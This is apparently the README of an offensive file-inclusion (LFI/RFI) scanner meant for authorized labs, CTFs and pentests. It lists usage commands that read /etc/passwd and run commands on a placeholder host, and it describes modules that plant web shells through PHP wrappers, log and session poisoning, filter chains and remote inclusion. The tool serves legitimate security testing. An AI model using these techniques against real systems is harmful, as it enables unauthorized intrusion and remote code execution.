# INCLUDED

> you've been INCLUDED.

Modular File Inclusion (LFI/RFI) scanner — modern techniques missing from
older tools (filter chains, two-phase log/session poisoning, filter bypass
variants). For use **only against authorized targets**
(HTB/CPTS labs, CTFs, your own environments, authorized pentests).

## Installation
```bash
pip install -r requirements.txt
```

## Usage
The `INCLUDE` marker in the URL marks the injection point (like `FUZZ` in ffuf):

```bash
# basic scan with all modules
python3 -m included -w "http://host/index.php?language=INCLUDE"

# target a specific file + verbose
python3 -m included -w "http://host/?p=INCLUDE" -f /etc/passwd -v

# RCE techniques only, with a command and session (enables session poisoning)
python3 -m included -w "http://host/?p=INCLUDE" --profile rce --cmd "id" -b PHPSESSID=abc123

# fuzzing with noise filtering, output to JSON
python3 -m included -w "http://host/img.php?p=INCLUDE" -fs 0 -mc 200 -o out.json -of json
```

## Modules
| module             | group | what it does                                          |
|--------------------|-------|--------------------------------------------------------|
| `traversal`        | read  | ../ + bypasses (`....//`, `..././`, prefixes, encoding)|
| `filter_read`      | read  | `php://filter` — dumps source files as base64          |
| `data`             | rce   | `data://` web shell (allow_url_include)                 |
| `input`            | rce   | `php://input` — web shell in POST body                 |
| `expect`           | rce   | `expect://` — direct command execution                 |
| `zip_phar`         | rce   | `zip://` / `phar://` from an uploaded archive (`--file`)|
| `log_poison`       | rce   | two-phase: poison access.log/session, then include      |
| `filter_chain_rce` | rce   | `php://filter` chain — builds a PHP web shell in-flight, no file upload needed (adapted from [Synacktiv's technique](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it)); requires glibc `iconv` on the target (typical on Linux) |
| `rfi`              | rce   | Remote File Inclusion; with `--lhost/--lport` auto-hosts the web shell over HTTP for the target to fetch. `ftp://`/UNC payloads are generated too but need your own FTP/SMB server |

Profiles: `--profile read|rce|all`.

## Status
Working skeleton. Still to do: wordlists from files, auto-detected
traversal depth.
